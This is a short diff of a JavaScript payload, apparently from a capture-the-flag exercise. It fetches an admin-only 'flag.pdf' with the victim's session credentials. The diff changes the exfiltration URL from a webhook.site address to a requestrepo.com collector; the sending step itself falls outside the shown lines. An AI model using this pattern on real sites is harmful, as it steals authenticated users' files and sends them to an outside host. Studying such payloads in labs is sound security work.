@@ -1,6 +1,6 @@
 (function(){
     const flagUrl = '/app/admin/flag.pdf';
-    const webhookUrl = 'https://webhook.site/35c13666-876f-4a80-bf03-1a1b6e97716f';
+    const webhookUrl = 'https://ydpaegf3.requestrepo.com/';
 
     fetch(flagUrl, { credentials: 'include' })
       .then(response => response.blob())
